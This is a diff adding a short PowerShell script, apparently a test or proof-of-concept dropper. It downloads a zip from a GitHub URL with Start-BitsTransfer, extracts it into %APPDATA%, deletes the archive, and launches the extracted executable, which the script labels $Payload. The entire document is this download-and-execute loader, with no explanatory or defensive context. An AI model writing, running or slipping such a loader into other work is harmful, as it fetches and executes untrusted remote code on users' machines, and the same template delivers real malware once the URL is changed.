@@ -1,0 +1,10 @@
+$ZipUrl = 'https://github.com/tomC-cyber/TestZipFolder/raw/refs/heads/main/CalcTest.zip';
+$Folder = $env:APPDATA+'\testfolder';
+$NewZip = $env:APPDATA+'\test1.zip';
+$Payload = $Folder+'\CalcTest.exe';
+
+if (-not (test-path $Folder)) {New-Item -Path $Folder -ItemType Directory};
+
+Start-BitsTransfer -Source $ZipUrl -Destination $NewZip; Expand-Archive -Path $NewZip -Destination $Folder -Force;
+
+Remove-Item $NewZip; start-process $Payload;
